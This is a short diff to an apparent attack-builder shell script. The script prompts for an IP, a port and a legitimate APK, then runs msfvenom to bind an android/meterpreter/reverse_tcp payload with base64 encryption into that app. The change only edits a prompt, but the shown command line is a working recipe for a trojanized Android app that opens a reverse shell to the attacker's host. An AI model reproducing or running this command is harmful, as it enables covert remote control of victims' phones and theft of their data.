@@ -8,7 +8,7 @@ echo -n "Enter Your IP: "
 read IP
 echo -n "Enter PORT No: "
 read PORT 
-echo -n "Enter your LEGIT app path: "
+echo -n "Enter The Name Of Your Legit apk: "
 read path 
 
 xterm -e msfvenom -x $path -p android/meterpreter/reverse_tcp --encrypt=base64 LHOST=$IP LPORT=$PORT -o $PAYLOAD.apk
